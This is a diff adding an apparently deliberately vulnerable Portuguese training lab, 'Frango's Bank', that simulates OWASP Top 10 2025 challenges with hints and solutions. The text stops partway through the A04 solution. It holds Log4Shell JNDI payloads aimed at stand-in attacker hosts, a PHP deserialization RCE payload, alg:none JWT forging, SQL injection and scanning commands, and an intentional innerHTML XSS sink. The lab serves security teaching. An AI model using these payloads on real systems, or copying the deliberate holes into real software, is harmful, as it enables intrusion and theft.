@@ -1,0 +1,479 @@
+
+<style>
+*{box-sizing:border-box;margin:0;padding:0;font-family:'Segoe UI',sans-serif}
+.hidden{display:none!important}
+body{background:#1a1a2e;color:#eee}
+.topbar{background:#cc2200;color:#fff;padding:8px 24px;display:flex;justify-content:space-between;align-items:center;font-size:12px}
+.navbar{background:#a81900;padding:0 20px;display:flex;align-items:center;height:56px;gap:16px}
+.logo{display:flex;align-items:center;gap:8px;color:#fff;font-weight:700;font-size:16px}
+.logo-sub{color:#ffcc88;font-size:9px;letter-spacing:1px;display:block}
+.diff-bar{margin-left:auto;display:flex;gap:8px;align-items:center}
+.diff-btn{padding:6px 14px;border:1px solid rgba(255,255,255,.3);background:transparent;color:#fff;border-radius:4px;font-size:12px;cursor:pointer;transition:all .2s}
+.diff-btn.active{background:#ffcc00;color:#333;border-color:#ffcc00;font-weight:700}
+.lab-badge{background:#ff4444;color:#fff;font-size:10px;padding:3px 8px;border-radius:3px;font-weight:700;letter-spacing:1px}
+.main{display:flex;min-height:560px}
+.sidebar{width:230px;background:#16213e;padding:16px 0;flex-shrink:0;display:flex;flex-direction:column}
+.sidebar-title{font-size:10px;color:#888;text-transform:uppercase;letter-spacing:1px;padding:0 16px 8px}
+.sidebar-item{padding:10px 16px;cursor:pointer;font-size:12px;color:#aaa;border-left:3px solid transparent;transition:all .2s;display:flex;align-items:center;gap:8px}
+.sidebar-item:hover{background:rgba(255,255,255,.05);color:#fff}
+.sidebar-item.active{background:rgba(204,34,0,.2);color:#ff6644;border-left-color:#cc2200}
+.sidebar-item .vuln-id{font-size:10px;background:rgba(255,100,0,.2);color:#ff6644;padding:2px 5px;border-radius:3px;font-weight:700;flex-shrink:0;min-width:28px;text-align:center}
+.sidebar-item.done-item .vuln-id{background:rgba(0,180,0,.15);color:#00cc44}
+.sidebar-item.done-item{color:#00cc44}
+.sidebar-cert{margin-top:auto;border-top:1px solid #333;padding:14px 16px}
+.cert-lock{text-align:center;padding:8px}
+.cert-lock-icon{font-size:28px;margin-bottom:4px}
+.cert-lock-txt{font-size:11px;color:#666;line-height:1.5}
+.cert-unlock-btn{width:100%;padding:10px;background:linear-gradient(135deg,#cc2200,#ff6600);color:#fff;border:none;border-radius:6px;font-size:12px;font-weight:700;cursor:pointer;margin-top:8px;transition:all .2s;letter-spacing:.5px}
+.cert-unlock-btn:hover{opacity:.9;transform:translateY(-1px)}
+.progress-wrap{padding:12px 16px;border-top:1px solid #333}
+.progress-bar{background:#333;border-radius:3px;height:6px;margin-top:4px}
+.progress-fill{background:linear-gradient(90deg,#cc2200,#ff6600);height:6px;border-radius:3px;transition:width .5s}
+.content{flex:1;padding:24px;overflow-y:auto;background:#0f0f23}
+.vuln-title{font-size:20px;font-weight:700;color:#fff;margin-bottom:4px}
+.vuln-owasp{font-size:12px;color:#ff6644;font-weight:600;margin-bottom:12px}
+.vuln-desc{font-size:13px;color:#aaa;line-height:1.7;margin-bottom:20px}
+.tabs{display:flex;gap:0;border-bottom:1px solid #333;margin-bottom:20px}
+.tab{padding:8px 18px;font-size:13px;cursor:pointer;color:#888;border-bottom:2px solid transparent;transition:all .2s}
+.tab:hover{color:#fff}
+.tab.active{color:#ff6644;border-bottom-color:#cc2200}
+.lab-box{background:#1a1a2e;border:1px solid #333;border-radius:8px;padding:20px;margin-bottom:16px}
+.lab-box h4{font-size:13px;font-weight:600;color:#ffcc00;margin-bottom:12px}
+.lab-input{width:100%;padding:9px 12px;background:#0f0f23;border:1px solid #444;border-radius:5px;color:#fff;font-size:13px;outline:none;font-family:'Courier New',monospace;margin-bottom:8px}
+.lab-input:focus{border-color:#cc2200}
+.lab-btn{padding:9px 20px;background:#cc2200;color:#fff;border:none;border-radius:5px;font-size:13px;font-weight:600;cursor:pointer;margin-right:8px;margin-top:4px;transition:background .2s}
+.lab-btn:hover{background:#a81900}
+.lab-btn.sec{background:#0f4c75}.lab-btn.sec:hover{background:#1b6ca8}
+.output-box{background:#000;border:1px solid #333;border-radius:5px;padding:14px;font-family:'Courier New',monospace;font-size:12px;color:#00ff41;min-height:60px;margin-top:12px;white-space:pre-wrap;word-break:break-all}
+.hint-box{background:#1a2a1a;border:1px solid #2d4a2d;border-radius:5px;padding:12px;font-size:12px;color:#88cc88;margin-top:10px;line-height:1.6}
+.solution-box{background:#1a1a00;border:1px solid #4a4a00;border-radius:5px;padding:14px;font-size:12px;color:#cccc00;margin-top:10px;line-height:1.8;font-family:'Courier New',monospace;white-space:pre-wrap}
+.info-card{background:#16213e;border-radius:8px;padding:16px;margin-bottom:12px}
+.info-card h5{font-size:12px;color:#ff6644;margin-bottom:8px;text-transform:uppercase;letter-spacing:.5px}
+.info-card p{font-size:13px;color:#aaa;line-height:1.6}
+.tag{display:inline-block;padding:2px 8px;border-radius:3px;font-size:11px;font-weight:600;margin-right:4px}
+.tag.crit{background:rgba(255,0,0,.2);color:#ff5555}
+.tag.high{background:rgba(255,100,0,.2);color:#ff8800}
+.tag.med{background:rgba(255,200,0,.2);color:#ffcc00}
+.flag-box{background:#1a0000;border:1px solid #cc2200;color:#ff4444;font-family:'Courier New',monospace;font-size:13px;padding:10px 16px;border-radius:5px;margin-top:10px;letter-spacing:1px}
+/* CERT PAGE */
+.cert-page{padding:32px;max-width:640px;margin:0 auto}
+.cert-form-card{background:#16213e;border:1px solid #333;border-radius:12px;padding:28px;margin-bottom:20px}
+.cert-form-card h3{font-size:16px;font-weight:600;color:#ff6644;margin-bottom:20px;display:flex;align-items:center;gap:8px}
+.cf-label{display:block;font-size:11px;font-weight:600;color:#888;text-transform:uppercase;letter-spacing:.5px;margin-bottom:6px;margin-top:16px}
+.cf-label:first-of-type{margin-top:0}
+.cf-input{width:100%;padding:10px 14px;background:#0f0f23;border:1.5px solid #444;border-radius:6px;font-size:14px;color:#fff;outline:none;transition:border .2s}
+.cf-input:focus{border-color:#cc2200}
+.radio-row{display:flex;gap:10px;margin-top:6px}
+.radio-opt{flex:1;padding:9px;background:#0f0f23;border:1.5px solid #444;border-radius:6px;text-align:center;cursor:pointer;font-size:13px;color:#888;transition:all .2s}
+.radio-opt.on{border-color:#cc2200;background:rgba(204,34,0,.1);color:#ff6644;font-weight:600}
+.cert-gen-btn{width:100%;margin-top:20px;padding:14px;background:linear-gradient(135deg,#cc2200,#ff6600);color:#fff;border:none;border-radius:8px;font-size:15px;font-weight:700;cursor:pointer;letter-spacing:.5px;transition:opacity .2s}
+.cert-gen-btn:hover{opacity:.9}
+.cert-preview-wrap{background:#16213e;border:1px solid #333;border-radius:12px;overflow:hidden}
+.cert-preview-header{background:#0f0f23;padding:12px 20px;font-size:12px;color:#888;display:flex;justify-content:space-between;align-items:center}
+.cert-canvas-wrap{padding:20px;background:#222;display:flex;justify-content:center}
+canvas#cert-canvas{border-radius:4px;max-width:100%;height:auto}
+.score-badge-big{display:inline-flex;align-items:center;gap:10px;background:rgba(204,34,0,.15);border:1px solid #cc2200;border-radius:8px;padding:10px 18px;margin-bottom:16px}
+.score-badge-big .pts{font-size:24px;font-weight:700;color:#ff6644}
+.score-badge-big .lbl{font-size:12px;color:#888}
+/* MODAL */
+.modal-ov{position:fixed;inset:0;background:rgba(0,0,0,.8);display:flex;align-items:center;justify-content:center;z-index:1000;padding:20px}
+.modal-box{background:#16213e;border:1px solid #cc2200;border-radius:12px;padding:32px;max-width:400px;width:100%;text-align:center}
+.modal-icon{font-size:52px;margin-bottom:12px}
+.modal-title{font-size:18px;font-weight:700;color:#fff;margin-bottom:8px}
+.modal-msg{font-size:13px;color:#aaa;margin-bottom:20px;line-height:1.6}
+.modal-btn{padding:10px 28px;background:#cc2200;color:#fff;border:none;border-radius:6px;font-size:14px;font-weight:600;cursor:pointer}
+</style>
+
+<div style="background:#1a1a2e;min-height:620px">
+<div class="topbar">
+  <span>🐥 Frango's Bank — <span class="lab-badge">DVWA LAB</span> — OWASP Top 10 2025</span>
+  <span>Score: <span id="score-badge" style="background:#ffcc00;color:#333;font-size:11px;font-weight:700;padding:3px 10px;border-radius:10px">0 / 1000 pts</span></span>
+</div>
+<div class="navbar">
+  <div class="logo">
+    <span style="font-size:24px">🐥</span>
+    <div><div>Frango's Bank</div><span class="logo-sub">GALINHEIRO HALL — DVWA 2025</span></div>
+  </div>
+  <div class="diff-bar">
+    <span style="font-size:12px;color:#ffcc88">Dificuldade:</span>
+    <button class="diff-btn active" onclick="setDiff('low',this)">Fácil</button>
+    <button class="diff-btn" onclick="setDiff('med',this)">Médio</button>
+    <button class="diff-btn" onclick="setDiff('high',this)">Difícil</button>
+  </div>
+</div>
+
+<div class="main">
+  <!-- SIDEBAR -->
+  <div class="sidebar">
+    <div class="sidebar-title">OWASP Top 10 — 2025</div>
+    <div class="sidebar-item active" id="si-a01" onclick="loadVuln('a01',this)"><span class="vuln-id">A01</span>Broken Access Control</div>
+    <div class="sidebar-item" id="si-a02" onclick="loadVuln('a02',this)"><span class="vuln-id">A02</span>Security Misconfiguration</div>
+    <div class="sidebar-item" id="si-a03" onclick="loadVuln('a03',this)"><span class="vuln-id">A03</span>Supply Chain Failures</div>
+    <div class="sidebar-item" id="si-a04" onclick="loadVuln('a04',this)"><span class="vuln-id">A04</span>Cryptographic Failures</div>
+    <div class="sidebar-item" id="si-a05" onclick="loadVuln('a05',this)"><span class="vuln-id">A05</span>Injection</div>
+    <div class="sidebar-item" id="si-a06" onclick="loadVuln('a06',this)"><span class="vuln-id">A06</span>Insecure Design</div>
+    <div class="sidebar-item" id="si-a07" onclick="loadVuln('a07',this)"><span class="vuln-id">A07</span>Authentication Failures</div>
+    <div class="sidebar-item" id="si-a08" onclick="loadVuln('a08',this)"><span class="vuln-id">A08</span>Integrity Failures</div>
+    <div class="sidebar-item" id="si-a09" onclick="loadVuln('a09',this)"><span class="vuln-id">A09</span>Logging &amp; Alerting</div>
+    <div class="sidebar-item" id="si-a10" onclick="loadVuln('a10',this)"><span class="vuln-id">A10</span>Exceptional Conditions</div>
+    <div class="sidebar-item" id="si-cert" onclick="loadVuln('cert',this)" style="border-top:1px solid #333;margin-top:4px;opacity:.4;pointer-events:none">
+      <span class="vuln-id" style="background:rgba(255,200,0,.1);color:#888">🏆</span>Certificado
+    </div>
+
+    <div class="progress-wrap">
+      <div style="font-size:10px;color:#888;display:flex;justify-content:space-between">
+        <span>Progresso</span><span id="prog-txt">0/10</span>
+      </div>
+      <div class="progress-bar"><div class="progress-fill" id="prog-fill" style="width:0%"></div></div>
+    </div>
+    <div class="sidebar-cert" id="cert-sidebar-box">
+      <div class="cert-lock">
+        <div class="cert-lock-icon" id="cert-lock-icon">🔒</div>
+        <div class="cert-lock-txt" id="cert-lock-txt">Conclua todas as<br>10 flags para desbloquear</div>
+        <button class="cert-unlock-btn hidden" id="cert-unlock-btn" onclick="loadVuln('cert',document.getElementById('si-cert'))">
+          🏆 Gerar Certificado
+        </button>
+      </div>
+    </div>
+  </div>
+
+  <!-- CONTENT -->
+  <div class="content" id="content"></div>
+</div>
+</div>
+
+<!-- MODAL -->
+<div class="modal-ov hidden" id="modal-ov">
+  <div class="modal-box">
+    <div class="modal-icon" id="m-icon">🎉</div>
+    <div class="modal-title" id="m-title"></div>
+    <div class="modal-msg" id="m-msg"></div>
+    <button class="modal-btn" onclick="closeModal()">OK</button>
+  </div>
+</div>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>
+<script>
+// ── STATE ────────────────────────────────────────────────────
+let difficulty='low', score=0, solved=new Set();
+let certName='', certPronome='ela', certData='';
+
+// ── UTILS ────────────────────────────────────────────────────
+function setDiff(d,btn){
+  difficulty=d;
+  document.querySelectorAll('.diff-btn').forEach(b=>b.classList.remove('active'));
+  btn.classList.add('active');
+  const cur=document.querySelector('.sidebar-item.active');
+  if(cur) cur.click();
+}
+
+function loadVuln(id,el){
+  document.querySelectorAll('.sidebar-item').forEach(i=>i.classList.remove('active'));
+  el.classList.add('active');
+  const fn = id==='cert' ? renderCert : VULNS[id];
+  document.getElementById('content').innerHTML = fn ? fn() : '';
+  if(id==='cert') initCert();
+}
+
+function showTab(tabId,group){
+  document.querySelectorAll('[data-group="'+group+'"]').forEach(t=>{
+    document.getElementById(t.dataset.target)?.classList.add('hidden');
+    t.classList.remove('active');
+  });
+  document.getElementById(tabId)?.classList.remove('hidden');
+  event.target.classList.add('active');
+}
+
+function tabs(id,labels){
+  const keys=['lab','info','sol'];
+  return `<div class="tabs">${labels.map((l,i)=>`<button class="tab${i===0?' active':''}" data-group="${id}t" data-target="${id}-${keys[i]}" onclick="showTab('${id}-${keys[i]}','${id}t')">${l}</button>`).join('')}</div>`;
+}
+
+function addScore(id,pts){
+  if(!solved.has(id)){
+    solved.add(id);
+    score+=pts;
+    document.getElementById('score-badge').textContent=score+' / 1000 pts';
+    document.getElementById('prog-txt').textContent=solved.size+'/10';
+    document.getElementById('prog-fill').style.width=(solved.size*10)+'%';
+    const si=document.getElementById('si-'+id);
+    if(si){ si.classList.add('done-item'); si.querySelector('.vuln-id').style.background='rgba(0,180,0,.15)'; si.querySelector('.vuln-id').style.color='#00cc44'; }
+    if(solved.size===10) unlockCert();
+  }
+}
+
+function unlockCert(){
+  const si=document.getElementById('si-cert');
+  si.style.opacity='1'; si.style.pointerEvents='auto';
+  si.classList.add('done-item');
+  document.getElementById('cert-lock-icon').textContent='🏆';
+  document.getElementById('cert-lock-txt').textContent='100% concluído!\nCertificado disponível';
+  document.getElementById('cert-unlock-btn').classList.remove('hidden');
+  showModal('🎉','Parabéns! Galinheiro Hall desbloqueado!','Você completou todas as 10 flags do OWASP Top 10 2025!\nSeu certificado está disponível no menu lateral.');
+}
+
+function showModal(icon,title,msg){
+  document.getElementById('m-icon').textContent=icon;
+  document.getElementById('m-title').textContent=title;
+  document.getElementById('m-msg').textContent=msg;
+  document.getElementById('modal-ov').classList.remove('hidden');
+}
+function closeModal(){ document.getElementById('modal-ov').classList.add('hidden'); }
+
+// ── DADOS DOS DESAFIOS ────────────────────────────────────────
+const ACCOUNTS={1001:{name:"Cornélio Pinto",cpf:"123.456.789-00",bal:"🌽 18.430,00",email:"cornelio@frangosbank.com",role:"user"},1002:{name:"Maria Galinha",cpf:"987.654.321-00",bal:"🌽 3.200,00",email:"maria@email.com",role:"user"},1003:{name:"João Pintinho",cpf:"111.222.333-44",bal:"🌽 750,00",email:"joao@email.com",role:"user"},1004:{name:"Ana Carijó",cpf:"555.444.333-22",bal:"🌽 45.000,00",email:"ana@email.com",role:"user"},1005:{name:"Admin Galinheiro",cpf:"000.000.000-00",bal:"🌽 999.999,00",email:"admin@frangosbank.com",role:"admin"}};
+
+function a01go(){const id=parseInt(document.getElementById('a01i').value)||1001;const a=ACCOUNTS[id];if(!a){document.getElementById('a01o').textContent='HTTP 404 Not Found';return;}const own=id===1001;document.getElementById('a01o').textContent=`HTTP/1.1 200 OK\n\n{\n  "account_id": ${id},\n  "name": "${a.name}",\n  "cpf": "${a.cpf}",\n  "email": "${a.email}",\n  "balance": "${a.bal}",\n  "role": "${a.role}"\n}\n\n${own?'[OK] Sua conta.':'[⚠️ IDOR] Acesso não autorizado a conta alheia!'}`;if(!own)addScore('a01',100);}
+function a02go(e){const r={headers:`HTTP/1.1 200 OK\nServer: Apache/2.2.8\nX-Powered-By: PHP/5.6.0\nAccess-Control-Allow-Origin: *\n\n[⚠️ MISCONFIG] Headers revelam stack completo!\nAusentes: CSP, X-Frame-Options, HSTS, X-Content-Type-Options`,admin:`HTTP/1.1 200 OK\n\n<title>Admin Panel</title>\n<!-- Sem autenticação! -->\n\n[⚠️ MISCONFIG] /admin acessível sem login!`,env:`HTTP/1.1 200 OK\n\nDB_PASS=galinha123\nJWT_SECRET=frango_jwt_2024\nAWS_ACCESS_KEY=AKIAIOSFODNN7EXAMPLE\nAWS_SECRET=wJalrXUtnFEMI/K7MDENG\n\n[⚠️ MISCONFIG] .env exposto com credenciais!`,backup:`HTTP/1.1 200 OK\n\nINSERT INTO tb_usuarios VALUES\n(1,'cornelio@frangosbank.com','senha123','123.456.789-00',18430),\n(2,'admin@frangosbank.com','admin','000.000.000-00',999999);\n\n[⚠️ MISCONFIG] Backup SQL público com senhas em texto claro!`};document.getElementById('a02o').textContent=r[e]||'';addScore('a02',100);}
+const CVE_DB={'log4j 2.14':'CVE-2021-44228 — Log4Shell\nCVSS 10.0 CRÍTICO\nRCE via JNDI: ${jndi:ldap://attacker.com/exploit}','spring 2.5':'CVE-2022-22965 — Spring4Shell\nCVSS 9.8 CRÍTICO\nRCE via DataBinder JDK9+','jquery 1.6':'CVE-2019-11358 — Prototype Pollution\nCVSS 6.1 MÉDIO','openssl 1.0':'CVE-2014-0160 — Heartbleed\nCVSS 7.5 ALTO\nVazamento de memória/chaves privadas','struts 2.3':'CVE-2017-5638\nCVSS 10.0 CRÍTICO — Hack da Equifax'};
+function a03go(){const q=document.getElementById('a03i').value.toLowerCase();let f=false;for(const[k,v]of Object.entries(CVE_DB)){if(q.includes(k.split(' ')[0])&&q.includes(k.split(' ')[1])){document.getElementById('a03o').textContent=`[NVD] ${k}\n\n${v}`;addScore('a03',100);f=true;break;}}if(!f)document.getElementById('a03o').textContent='Tente: "log4j 2.14", "spring 2.5", "jquery 1.6", "openssl 1.0"';}
+function a03scan(){document.getElementById('a03o').textContent=`[dependency-check] Escaneando /app...\n\nlog4j-core-2.14.0.jar → CVE-2021-44228 (CVSS 10.0) LOG4SHELL ⚠️\nspring-boot-2.5.0.jar  → CVE-2022-22965 (CVSS 9.8)  SPRING4SHELL ⚠️\njquery-1.6.1.min.js    → CVE-2019-11358 (CVSS 6.1) ⚠️\n\n[⚠️ 3 vulnerabilidades críticas!]`;addScore('a03',100);}
+function a04decode(){try{const d=atob(document.getElementById('a04i').value.trim());document.getElementById('a04o').textContent=`Decodificado: ${d}\n\n[⚠️ Base64 NÃO é criptografia!]\nConteúdo exposto: ${d}`;addScore('a04',50);}catch(e){document.getElementById('a04o').textContent='Base64 inválido. Tente: dXNlcjpjb3JuZWxpbzpzZW5oYTEyMw==';}}
+function a04cookie(){document.getElementById('a04o').textContent=`Cookie JWT decodificado:\n→ {"user":"cornelio","role":"user"}\n\n[⚠️ CRYPTO FAILURE]\n  - Payload legível sem chave\n  - Flags ausentes: Secure, HttpOnly, SameSite\n  - Altere role para "admin" e reencodeie!`;addScore('a04',100);}
+function a05sqli(){const u=document.getElementById('a05u').value;const attack=u.includes("'")||u.toLowerCase().includes(' or ');document.getElementById('a05o').textContent=attack?`[QUERY] SELECT * FROM users WHERE email='${u}'...\n\n[✅ BYPASS!] Comentário anulou a verificação de senha!\nLogado como: admin@frangosbank.com | Role: ADMIN\n\n[⚠️ SQL INJECTION — CWE-89]`:`[QUERY] SELECT * FROM users WHERE email='${u}'...\nHTTP 401 — Credenciais inválidas\n\nDica: tente admin'--`;if(attack)addScore('a05',50);}
+function a05xss(){const i=document.getElementById('a05x').value;const o=document.getElementById('a05xo');if(i.includes('<')){o.innerHTML='<div style="font-size:11px;color:#888;margin-bottom:4px">Resultado (innerHTML sem sanitização):</div>'+i;addScore('a05',50);}else{o.textContent='Sem resultado para: '+i;}}
+function a06race(){const val=parseFloat(document.getElementById('a06v').value)||500,n=parseInt(document.getElementById('a06n').value)||2;let out=`[RACE] ${n} threads simultâneas com 🌽 ${val.toFixed(2)}...\n\n`;for(let i=1;i<=n;i++)out+=`[T${i}] Leu saldo: 🌽 ${val.toFixed(2)} → APROVADO\n`;out+='\n';for(let i=1;i<=n;i++)out+=`[T${i}] Debitando 🌽 ${val.toFixed(2)}... OK\n`;out+=`\nSaldo final: 🌽 ${(val-val*n).toFixed(2)}`;if(n>=2){out+=`\n\n[⚠️ RACE CONDITION] Saldo negativo sem lock!`;addScore('a06',50);}document.getElementById('a06o').textContent=out;}
+function a06neg(){const v=parseFloat(document.getElementById('a06neg').value)||0;document.getElementById('a06o2').textContent=v<0?`[⚠️ INSECURE DESIGN] Valor negativo aceito!\nSeu saldo aumentou em 🌽 ${Math.abs(v).toFixed(2)}!`:'Digite um valor negativo, ex: -1000';if(v<0)addScore('a06',100);}
+function a07brute(){const u=document.getElementById('a07u').value;const wl=['123456','password','admin','letmein','qwerty','frango123','galinha','admin123'];let out=`[HYDRA] Alvo: ${u}\nSem rate limiting — sem lockout!\n\n`;wl.forEach((w,i)=>{out+=`[${String(i+1).padStart(2,'0')}] ${w.padEnd(12)} → ${w==='admin'?'✅ ENCONTRADA!':'❌'}\n`;});out+=`\n[✅] Credencial: ${u} : admin\n[⚠️] ${wl.length} tentativas sem bloqueio!`;document.getElementById('a07o').textContent=out;addScore('a07',100);}
+function a07tok(){const t=['dXNlcjoxNzQ1OTk5MDAwOjEwMDE=','dXNlcjoxNzQ1OTk5MDYwOjEwMDE='];let o='[TOKENS]\n\n';t.forEach((x,i)=>{o+=`Token ${i+1}: ${x}\nDecodificado: ${atob(x)}\n\n`;});o+='[⚠️] Padrão: base64(user:timestamp:id) — previsível!';document.getElementById('a07o').textContent=o;addScore('a07',100);}
+function a08jwt(){try{const p=document.getElementById('a08i').value||'{"user":"cornelio","role":"admin"}';const h=btoa('{"alg":"none","typ":"JWT"}').replace(/=+$/,'');const pb=btoa(p).replace(/=+$/,'');document.getElementById('a08o').textContent=`[JWT FORJADO — alg:none]\n\nToken: ${h}.${pb}.\n\n[⚠️ INTEGRITY FAILURE]\nServidor aceitou sem assinatura!\nRole: admin`;addScore('a08',100);}catch(e){document.getElementById('a08o').textContent='JSON inválido.';}}
+function a08d(){document.getElementById('a08o').textContent=`[DESERIALIZAÇÃO INSEGURA]\n\nPayload PHP: O:8:"UserPref":1:{s:4:"exec";s:6:"whoami";}\n\n[SERVER] Deserializando cookie...\n[SERVER] __wakeup() executado: root\n\n[⚠️ RCE via deserialização PHP! CWE-502]`;addScore('a08',100);}
+function a09go(t){const r={logs:`HTTP/1.1 200 OK — /logs/app.log\n\n[08:14:22] LOGIN user=cornelio pass=senha123 ip=187.x.x.x ← SENHA!\n[08:10:13] FAILED user=admin (x100 tentativas) ← SEM ALERTA!\n[08:11:55] LOGIN user=admin pass=admin ← ENCONTRADO!\n\n[⚠️ Senhas em texto claro + sem alerta de brute force!]`,noalert:`1.000 tentativas de login → 0 alertas gerados\nTempo: 4 minutos | IPs bloqueados: 0\n\n[⚠️ ALERTING FAILURE] Ataque completo sem detecção!`,inject:`Input: admin\\n[09:00:00] LOGIN admin SUCCESS ip=127.0.0.1\n\nLog gerado:\n[08:59:59] FAILED user=admin\n[09:00:00] LOGIN admin SUCCESS ip=127.0.0.1 ← FALSA!\n\n[⚠️ LOG INJECTION — CWE-117]`};document.getElementById('a09o').textContent=r[t]||'';addScore('a09',100);}
+function a10go(t){const r={stack:`HTTP/1.1 500 Internal Server Error\n\njava.sql.SQLException: syntax near ''''\n  at UserDAO.findByUsername(UserDAO.java:42)\n  at AuthService.login(AuthService.java:28)\n\nDatabase: MySQL 5.6 @ 10.0.0.5:3306\nSchema: frangosbank_prod\n\n[⚠️ Stack trace expõe: linguagem, IP, schema, classes!]`,type:`POST /api/transfer {"amount":"1000abc"}\n[JS] parseFloat("1000abc") → 1000\n[SERVER] Transferência de 🌽 1000 processada!\n\nPOST /api/transfer {"amount":null}\n[SERVER] NullPointerException → acessso permitido (fail open!)\n\n[⚠️ TYPE CONFUSION + FAIL OPEN — CWE-704]`};document.getElementById('a10o').textContent=r[t]||'';addScore('a10',100);}
+
+// ── VULNS ─────────────────────────────────────────────────────
+const VULNS={
+a01:()=>`<div class="vuln-title">A01 — Broken Access Control</div><div class="vuln-owasp">OWASP 2025 #1 &nbsp;|&nbsp; <span class="tag crit">CRÍTICO</span></div><div class="vuln-desc">Usuários acessam recursos além de suas permissões. IDOR, escalada de privilégio, forced browsing.</div>${tabs('a01',['🧪 Lab','📖 Teoria','🚩 Solução'])}<div id="a01-lab"><div class="lab-box"><h4>🎯 IDOR — Acesse a conta de outro usuário via account_id</h4><div style="font-size:12px;color:#aaa;margin-bottom:8px">Você é Cornélio (id=1001). O endpoint não verifica propriedade.</div><label style="font-size:12px;color:#aaa">GET /api/v1/account?id=</label><input class="lab-input" id="a01i" type="number" value="1001" style="width:100px;display:inline-block;margin:0 8px"/><button class="lab-btn" onclick="a01go()">Enviar</button><div class="output-box" id="a01o">// Aguardando...</div>${difficulty==='low'?'<div class="hint-box">💡 Tente IDs entre 1002 e 1005</div>':''}</div></div><div id="a01-info" class="hidden"><div class="info-card"><h5>IDOR</h5><p>Aplicação usa IDs controláveis sem verificar autorização server-side.</p></div><div class="info-card"><h5>Correção</h5><p>Validar server-side: o recurso pertence ao usuário autenticado?</p></div></div><div id="a01-sol" class="hidden"><div class="solution-box">GET /api/v1/account?id=1002  # conta alheia
+GET /api/v1/account?id=1005  # admin
+ffuf -u /api/v1/account?id=FUZZ -w ids.txt -H "Auth: Bearer TOKEN"</div><div class="flag-box" id="a01-flag" style="display:none">🚩 FLAG{A01_FRANGO_IDOR_GALINHEIRO_2025}</div><button class="lab-btn" style="margin-top:12px" onclick="document.getElementById('a01-flag').style.display='block';addScore('a01',100)">Revelar flag (+100 pts)</button></div>`,
+
+a02:()=>`<div class="vuln-title">A02 — Security Misconfiguration</div><div class="vuln-owasp">OWASP 2025 #2 &nbsp;|&nbsp; <span class="tag high">ALTO</span></div><div class="vuln-desc">Headers ausentes, arquivos sensíveis expostos, painéis sem proteção, CORS aberto.</div>${tabs('a02',['🧪 Lab','📖 Teoria','🚩 Solução'])}<div id="a02-lab"><div class="lab-box"><h4>🎯 Descubra endpoints e configurações expostas</h4><button class="lab-btn" onclick="a02go('headers')">GET / — Headers</button><button class="lab-btn sec" onclick="a02go('admin')">GET /admin</button><button class="lab-btn sec" onclick="a02go('env')">GET /.env</button><button class="lab-btn sec" onclick="a02go('backup')">GET /backup.sql</button><div class="output-box" id="a02o">// Selecione um endpoint...</div>${difficulty==='low'?'<div class="hint-box">💡 Comece pelos headers, depois tente /.env</div>':''}</div></div><div id="a02-info" class="hidden"><div class="info-card"><h5>Misconfigurações comuns</h5><p>Server/X-Powered-By, CORS *, debug em produção, credenciais padrão, .git exposto.</p></div></div><div id="a02-sol" class="hidden"><div class="solution-box">nikto -h https://target.com
+gobuster dir -u https://target -w common.txt -x env,sql,bak,git</div><div class="flag-box" id="a02-flag" style="display:none">🚩 FLAG{A02_FRANGO_MISCONFIG_ENV_EXPOSTO}</div><button class="lab-btn" style="margin-top:12px" onclick="document.getElementById('a02-flag').style.display='block';addScore('a02',100)">Revelar flag (+100 pts)</button></div>`,
+
+a03:()=>`<div class="vuln-title">A03 — Software Supply Chain Failures</div><div class="vuln-owasp">OWASP 2025 #3 &nbsp;|&nbsp; <span class="tag crit">CRÍTICO</span></div><div class="vuln-desc">Dependências com CVEs conhecidos, bibliotecas maliciosas, pipelines CI/CD comprometidos.</div>${tabs('a03',['🧪 Lab','📖 Teoria','🚩 Solução'])}<div id="a03-lab"><div class="lab-box"><h4>🎯 Identifique componentes vulneráveis</h4><div class="output-box" style="margin-bottom:10px;color:#ffcc00">Stack: Apache/2.2.8 | PHP/5.6.0 | jQuery 1.6.1
+Spring Boot 2.5.0 | Log4j 2.14.0 | OpenSSL 1.0.1</div><input class="lab-input" id="a03i" placeholder='"log4j 2.14", "spring 2.5", "jquery 1.6", "openssl 1.0"'/><button class="lab-btn" onclick="a03go()">Buscar CVEs</button><button class="lab-btn sec" onclick="a03scan()">dependency-check</button><div class="output-box" id="a03o">// Aguardando...</div>${difficulty==='low'?'<div class="hint-box">💡 Log4j 2.14 = Log4Shell (CVSS 10.0)</div>':''}</div></div><div id="a03-info" class="hidden"><div class="info-card"><h5>Supply Chain</h5><p>Log4Shell, Spring4Shell, typosquatting npm/pip, backdoor em libs open-source (xz-utils).</p></div></div><div id="a03-sol" class="hidden"><div class="solution-box">dependency-check --project "FrangosBank" --scan /app
+# Log4Shell em qualquer campo logado:
+\${jndi:ldap://ATTACKER:1389/exploit}</div><div class="flag-box" id="a03-flag" style="display:none">🚩 FLAG{A03_FRANGO_LOG4SHELL_SUPPLYCHAIN}</div><button class="lab-btn" style="margin-top:12px" onclick="document.getElementById('a03-flag').style.display='block';addScore('a03',100)">Revelar flag (+100 pts)</button></div>`,
+
+a04:()=>`<div class="vuln-title">A04 — Cryptographic Failures</div><div class="vuln-owasp">OWASP 2025 #4 &nbsp;|&nbsp; <span class="tag high">ALTO</span></div><div class="vuln-desc">Base64 como "criptografia", MD5/SHA1 para senhas, TLS desatualizado, cookies sem flags.</div>${tabs('a04',['🧪 Lab','📖 Teoria','🚩 Solução'])}<div id="a04-lab"><div class="lab-box"><h4>🎯 Decodifique dados "protegidos"</h4><div class="output-box" style="margin-bottom:10px;color:#ffcc00">localStorage["fb_session"] = "dXNlcjpjb3JuZWxpbzpzZW5oYTEyMw=="
+cookie: auth_token=eyJ1c2VyIjoiY29ybmVsaW8iLCJyb2xlIjoidXNlciJ9</div><input class="lab-input" id="a04i" placeholder="Cole o Base64 aqui"/><button class="lab-btn" onclick="a04decode()">Decodificar</button><button class="lab-btn sec" onclick="a04cookie()">Analisar cookie</button><div class="output-box" id="a04o">// Aguardando...</div>${difficulty==='low'?'<div class="hint-box">💡 Cole "dXNlcjpjb3JuZWxpbzpzZW5oYTEyMw==" e clique em Decodificar</div>':''}</div></div><div id="a04-info" class="hidden"><div class="info-card"><h5>Erros comuns</h5><p>Senhas em MD5, Base64 como proteção, HTTP para dados sensíveis, IVs estáticos.</p></div></div><div id="a04-sol" class="hidden"><div class="solution-box">echo "dXNlcjpjb3JuZWxpbzpzZW5oYTEyMw==" | base64 -d
+# → user:cornelio:senha123
